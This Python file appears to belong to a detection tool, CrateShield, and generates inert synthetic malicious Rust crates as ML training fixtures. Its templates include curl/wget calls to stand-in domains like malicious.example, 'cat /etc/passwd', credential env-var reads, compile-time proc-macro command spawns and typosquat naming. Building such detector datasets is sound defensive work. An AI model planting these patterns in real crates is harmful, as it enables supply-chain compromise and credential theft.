"""Generates synthetic malicious Rust crates covering ALL signal families
CrateShield scores on, not just build.rs + unsafe. Real malicious Rust
crates are extremely rare (RustSec has under 20 ever, most now deleted from
the registry), so this is the primary lever for giving the ML models enough
labeled malicious examples to actually learn from, without depending on
expensive/rate-limited LLM calls for every training example.

Every generated crate is clearly a local fixture (never published anywhere)
and is entirely inert — no synthetic build.rs here actually reaches the
network, spawns a real payload, or executes anything; they exist purely to
give the tree-sitter extractor realistic AST patterns to detect.

v2 change: templates are now PARAMETERIZED (random IPs/domains/env-var
names/commands/dep names drawn from pools) instead of a fixed handful of
literal strings repeated verbatim. At 150 crates the old version had only
~4 distinct build.rs bodies and ~15 typosquat targets, so the model could
memorize exact byte patterns rather than learning the underlying signal
shape. Parameterizing means every crate is a distinct AST instance while
still exercising the same behavioral category.
"""
import random
import shutil
from pathlib import Path

from crateshield.config import ROOT

SYNTHETIC_DIR = ROOT / "data" / "synthetic_crates"

# ---------------------------------------------------------------------------
# Parameter pools — draw from these instead of using literal fixed strings
# ---------------------------------------------------------------------------
FAKE_IPS = [
    "192.168.1.1", "10.0.0.1", "172.16.0.5", "10.0.0.1:4444", "192.168.0.100",
    "203.0.113.7", "198.51.100.23", "127.0.0.1:31337", "10.10.10.10",
]
FAKE_DOMAINS = [
    "malicious.example", "totally-legit-cdn.example", "telemetry-collect.example",
    "pkg-mirror.example", "update-service.example", "metrics-relay.example",
    "asset-cache.example",
]
SENSITIVE_ENV_VARS = [
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN",
    "SSH_AUTH_SOCK", "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET",
    "DOCKER_PASSWORD", "CARGO_REGISTRY_TOKEN", "DATABASE_URL", "STRIPE_SECRET_KEY",
]
SPAWN_COMMANDS = [
    ("curl", ["-s", "http://{domain}/x"]),
    ("sh", ["-c", "echo pwned"]),
    ("bash", ["-c", "cat /etc/passwd"]),
    ("wget", ["http://{domain}/payload"]),
    ("powershell", ["-Command", "Get-Process"]),
    ("id", []),
    ("whoami", []),
    ("cmd", ["/c", "dir"]),
]
SUSPICIOUS_DEP_TEMPLATES = [
    'winapi = {{ version = "*", features = ["winuser", "wincrypt", "processthreadsapi"] }}\n',
    'reqwest = {{ git = "https://github.com/{fake_org}/reqwest" }}\n',
    'base64 = "*"\ndyn-obfstr = "*"\n',
    'anon-http-client = "0.0.1"\nquiet-exfil = "0.0.1"\n',
    '{typosquat_dep} = "*"\n',
    'sys-info = {{ git = "https://github.com/{fake_org}/sys-info-mirror" }}\n',
    'obfstr = "*"\nxor-crypt = "*"\n',
]
FAKE_ORGS = ["totally-legit-mirror", "official-rust-fork", "trusted-packages", "rust-lang-mirror-cdn"]

TYPOSQUAT_TARGETS = [
    "serde", "tokio", "rand", "reqwest", "clap", "regex", "log", "rayon",
    "hyper", "actix-web", "diesel", "sqlx", "anyhow", "thiserror", "bytes",
    "futures", "serde_json", "chrono", "uuid", "tracing", "once_cell",
    "itertools", "async-trait", "syn", "quote", "proc-macro2", "crossbeam",
    "parking_lot", "num-traits", "url",
]


def _rand_build_rs(rng: random.Random) -> str:
    """Build a randomized build.rs body drawing from network/env/spawn
    behaviors in varying combinations, so no two are byte-identical."""
    parts_head = []
    parts_body = []

    if rng.random() < 0.6:
        ip = rng.choice(FAKE_IPS)
        parts_head.append("use std::net::TcpStream;")
        parts_body.append(f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}')

    if rng.random() < 0.6:
        var = rng.choice(SENSITIVE_ENV_VARS)
        parts_head.append("use std::env;")
        parts_body.append(f'    let _v = env::var("{var}").unwrap_or_default();')

    if rng.random() < 0.6:
        cmd, args = rng.choice(SPAWN_COMMANDS)
        domain = rng.choice(FAKE_DOMAINS)
        parts_head.append("use std::process::Command;")
        arg_calls = "".join(f'.arg("{a.format(domain=domain)}")' for a in args)
        parts_body.append(f'    Command::new("{cmd}"){arg_calls}.spawn().ok();')

    if not parts_body:
        # Ensure at least one behavior fires
        ip = rng.choice(FAKE_IPS)
        parts_head.append("use std::net::TcpStream;")
        parts_body.append(f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}')

    head = "\n".join(sorted(set(parts_head)))
    body = "\n".join(parts_body)
    return f"{head}\nfn main() {{\n{body}\n}}\n"


def _rand_unsafe_block(rng: random.Random, density: int) -> str:
    addrs = [hex(rng.randint(0x1000, 0xFFFFFFFF)) for _ in range(density)]
    fns = []
    for i, addr in enumerate(addrs):
        fns.append(
            f"pub fn do_something_unsafe_{i}() {{\n"
            f"    unsafe {{\n"
            f"        let ptr = {addr} as *mut u32;\n"
            f"        *ptr = 1;\n"
            f"    }}\n"
            f"}}\n"
        )
    return "\n".join(fns)


LIB_RS_SAFE = """
pub fn do_something_safe() {
    println!("I am a completely benign crate.");
}
"""


def _rand_proc_macro_lib(rng: random.Random) -> str:
    cmd, args = rng.choice(SPAWN_COMMANDS)
    arg_calls = "".join(f'.arg("{a}")' for a in args if "{domain}" not in a)
    macro_name = rng.choice(["evil_macro", "hidden_hook", "build_helper", "codegen_inner"])
    return f"""
extern crate proc_macro;
use proc_macro::TokenStream;
use std::process::Command;

#[proc_macro]
pub fn {macro_name}(_input: TokenStream) -> TokenStream {{
    // Malicious proc-macros run at COMPILE time, before any "normal" code
    // review would even see a compiled binary.
    let _ = Command::new("{cmd}"){arg_calls}.output();
    TokenStream::new()
}}
"""


CARGO_TOML_PROC_MACRO = "[lib]\nproc-macro = true\n"


def _typosquat_name(target: str, rng: random.Random) -> str:
    """Generate a plausible typosquat of a popular crate name: character
    swap, omission, duplication, or hyphen/underscore confusion -- the same
    substitution classes real typosquats use (e.g. proc-macro1 vs proc-macro2,
    rustdecimal vs rust_decimal)."""
    technique = rng.choice(["swap", "omit", "dup", "sep", "homoglyph_digit"])
    chars = list(target)
    if technique == "swap" and len(chars) > 2:
        i = rng.randrange(len(chars) - 1)
        chars[i], chars[i + 1] = chars[i + 1], chars[i]
    elif technique == "omit" and len(chars) > 3:
        del chars[rng.randrange(1, len(chars) - 1)]
    elif technique == "dup":
        i = rng.randrange(len(chars))
        chars.insert(i, chars[i])
    elif technique == "sep":
        return target.replace("-", "_") if "-" in target else target + "s"
    elif technique == "homoglyph_digit":
        # e.g. serde -> serde1, rand -> rand0 (mirrors proc-macro1/proc-macro2 pattern)
        return target + str(rng.choice([0, 1, 2]))
    return "".join(chars)


def _write_crate(crate_dir: Path, name: str, cargo_extra: str, build_rs: str | None,
                  lib_rs: str, extra_cargo_section: str = "") -> None:
    crate_dir.mkdir(parents=True, exist_ok=True)
    cargo_toml = (
        f'[package]\nname = "{name}"\nversion = "0.1.0"\nedition = "2021"\n\n'
        f'{extra_cargo_section}[dependencies]\n{cargo_extra}\n'
    )
    (crate_dir / "Cargo.toml").write_text(cargo_toml)
    if build_rs:
        (crate_dir / "build.rs").write_text(build_rs)
    src_dir = crate_dir / "src"
    src_dir.mkdir(exist_ok=True)
    (src_dir / "lib.rs").write_text(lib_rs)


def generate_synthetic_crates(count: int = 400, seed: int = 42) -> list[str]:
    """Generates `count` synthetic malicious crates spread across all 6 risk
    signal families (build.rs network/env/spawn, unsafe density, proc-macro
    imports, dependency anomalies, typosquatting). Every crate body is
    parameterized (random IPs/domains/env vars/commands/dep names) so crates
    within the same category are distinct AST instances, not copies of a
    handful of literal templates. Returns the list of generated crate names
    (== folder names) so callers don't need to assume a fixed naming scheme.
    """
    if SYNTHETIC_DIR.exists():
        shutil.rmtree(SYNTHETIC_DIR)
    SYNTHETIC_DIR.mkdir(parents=True, exist_ok=True)

    rng = random.Random(seed)
    names: list[str] = []
    used_names: set[str] = set()

    def _dedup(candidate: str) -> str:
        base = candidate
        n = 1
        while candidate in used_names:
            n += 1
            candidate = f"{base}{n}"
        used_names.add(candidate)
        return candidate

    # Allocate roughly: 35% build.rs-focused, 15% proc-macro-focused,
    # 20% dependency-anomaly-focused, 20% typosquat-focused, 10% combined
    # (multiple categories firing at once, since real attacks often stack
    # signals rather than isolate one).
    n_build = int(count * 0.35)
    n_procmacro = int(count * 0.15)
    n_depanomaly = int(count * 0.20)
    n_typosquat = int(count * 0.20)
    n_combined = count - n_build - n_procmacro - n_depanomaly - n_typosquat

    idx = 0

    # --- build.rs-focused ---
    for _ in range(n_build):
        idx += 1
        name = f"syn_buildrs_{idx}"
        cargo_extra = 'serde = "1.0"\n' if rng.random() < 0.2 else ""
        build_rs = _rand_build_rs(rng) if rng.random() < 0.9 else None
        lib_rs = _rand_unsafe_block(rng, rng.randint(2, 8)) if rng.random() < 0.6 else LIB_RS_SAFE
        _write_crate(SYNTHETIC_DIR / name, name, cargo_extra, build_rs, lib_rs)
        names.append(name)

    # --- proc-macro-focused ---
    for _ in range(n_procmacro):
        idx += 1
        name = f"syn_procmacro_{idx}"
        crate_dir = SYNTHETIC_DIR / name
        lib_rs = _rand_proc_macro_lib(rng)
        build_rs = _rand_build_rs(rng) if rng.random() < 0.5 else None
        _write_crate(crate_dir, name, "", build_rs, lib_rs,
                      extra_cargo_section=CARGO_TOML_PROC_MACRO + "\n")
        names.append(name)

    # --- dependency-anomaly-focused ---
    for _ in range(n_depanomaly):
        idx += 1
        name = f"syn_depanomaly_{idx}"
        k = rng.randint(1, 3)
        chosen_templates = rng.sample(SUSPICIOUS_DEP_TEMPLATES, k=k)
        dep_block = ""
        for t in chosen_templates:
            dep_block += t.format(
                fake_org=rng.choice(FAKE_ORGS),
                typosquat_dep=_typosquat_name(rng.choice(TYPOSQUAT_TARGETS), rng),
            )
        lib_rs = _rand_unsafe_block(rng, rng.randint(1, 4)) if rng.random() < 0.4 else LIB_RS_SAFE
        _write_crate(SYNTHETIC_DIR / name, name, dep_block, None, lib_rs)
        names.append(name)

    # --- typosquat-focused (crate NAME itself is the malicious signal) ---
    for _ in range(n_typosquat):
        idx += 1
        target = rng.choice(TYPOSQUAT_TARGETS)
        name = _typosquat_name(target, rng)
        if name == target:
            name = name + "0"
        name = _dedup(name)
        build_rs = _rand_build_rs(rng) if rng.random() < 0.5 else None
        lib_rs = LIB_RS_SAFE  # typosquats often ship innocuous-looking src/lib.rs
        _write_crate(SYNTHETIC_DIR / name, name, "", build_rs, lib_rs)
        names.append(name)

    # --- combined (multiple categories stacked, mirrors real attacks) ---
    for _ in range(n_combined):
        idx += 1
        target = rng.choice(TYPOSQUAT_TARGETS)
        name = _typosquat_name(target, rng)
        if name == target:
            name = name + str(idx)
        name = _dedup(name)
        dep_block = rng.choice(SUSPICIOUS_DEP_TEMPLATES).format(
            fake_org=rng.choice(FAKE_ORGS),
            typosquat_dep=_typosquat_name(rng.choice(TYPOSQUAT_TARGETS), rng),
        )
        build_rs = _rand_build_rs(rng)
        lib_rs = _rand_unsafe_block(rng, rng.randint(2, 6))
        extra = CARGO_TOML_PROC_MACRO + "\n" if rng.random() < 0.3 else ""
        if extra:
            lib_rs = _rand_proc_macro_lib(rng) + "\n" + lib_rs
        _write_crate(SYNTHETIC_DIR / name, name, dep_block, build_rs, lib_rs,
                      extra_cargo_section=extra)
        names.append(name)

    print(f"Generated {len(names)} synthetic malicious crates in {SYNTHETIC_DIR} "
          f"({n_build} build.rs, {n_procmacro} proc-macro, {n_depanomaly} dependency-anomaly, "
          f"{n_typosquat} typosquat, {n_combined} combined)")
    return names
